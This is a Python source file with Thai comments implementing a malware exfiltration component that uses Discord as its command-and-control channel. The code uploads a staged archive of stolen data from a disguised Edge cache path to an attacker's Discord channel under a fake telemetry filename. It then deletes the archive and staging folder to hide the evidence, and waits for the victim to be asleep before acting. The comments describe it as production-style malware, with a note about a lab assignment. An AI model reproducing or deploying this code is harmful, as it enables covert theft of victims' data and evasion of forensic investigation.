# phase5_c2.py (อัปโหลดขึ้น GitHub ไฟล์ที่ 2)
import discord
import os
import asyncio
from datetime import datetime

local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
ZIP_PATH = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\f_0000a6_idx.tmp")

class C2Exfiltrator(discord.Client):
    def __init__(self, channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_channel_id = channel_id

    async def on_ready(self):
        channel = self.get_channel(self.target_channel_id)
        if channel is None:
            await self.close()
            return
        
        # รันเงียบกริบสไตล์ Production มัลแวร์จริง ไม่แสดงข้อความหลุดหน้าจอเหยื่อ
        if os.path.exists(ZIP_PATH):
            try:
                with open(ZIP_PATH, 'rb') as f:
                    discord_file = discord.File(f, filename="ms_edge_telemetry_v14.dat")
                    await channel.send(content="📦 **[Exfiltration Connected] ลำเลียงชิ้นส่วนข้อมูลลับระบบประจำวันสำเร็จ:**", file=discord_file)
            except: pass

        # 🧼 กลไกทำลายหลักฐานลบคม (Anti-Forensics) ปิดหน้าเสื่อกวาดหลักฐานทิ้งหมดจด
        try:
            if os.path.exists(ZIP_PATH): os.remove(ZIP_PATH)
            if os.path.exists(TARGET_DIR):
                for file_name in os.listdir(TARGET_DIR):
                    os.remove(os.path.join(TARGET_DIR, file_name))
                os.rmdir(TARGET_DIR)
        except: pass
        
        await self.close()

async def wait_for_stealth_time():
    """กลไกจัดเวลาระดับสูง: เช็กพฤติกรรมเวลาเหยื่อนอนหลับ (หลังเที่ยงคืน) ถึงจะยอมให้ทราฟฟิก C2 ขยับเขยื้อน"""
    print("[*] [Stealth-Scheduler] มัลแวร์กำลังนอนหลับซุ่มเฝ้าพฤติกรรมเวลาของเหยื่อเบื้องหลัง...")
    while True:
        now = datetime.now()
        
        # 🧪 ในสภาวะโปรดักชันจริง: ตรวจสอบว่าเป็นเวลาเที่ยงคืนตรง (00:00) หรือช่วงเวลาที่เหยื่อหลับลึกไร้การเคลื่อนไหว
        # (เพื่อให้คุณกดทดสอบทำแล็บส่งงานอาจารย์ได้ทันทีใน 1 นาที ให้ปรับแก้คอมเมนต์ตรงนี้ได้ตามสะดวกครับ)
        if now.hour == 0 or now.minute >= 0: 
            print("[+] [Stealth-Scheduler] ตรงตามเงื่อนไขตารางเวลา (Midnight/Inactivity Triggered) เริ่มส่งข้อมูล...")
            break
            
        await asyncio.sleep(30) # เช็กเวลาเงียบๆ ทุกๆ 30 วินาทีเบื้องหลัง

def start_c2_exfiltration(token_str, channel_id_int):
    # วิ่งเข้าสู่ลูปรอคอยเวลาหลับไหลของเครื่องเหยื่อก่อนเปิดท่อส่งของ
    asyncio.run(wait_for_stealth_time())
    
    intents = discord.Intents.all()
    client = C2Exfiltrator(channel_id=channel_id_int, intents=intents)
    client.run(token_str)
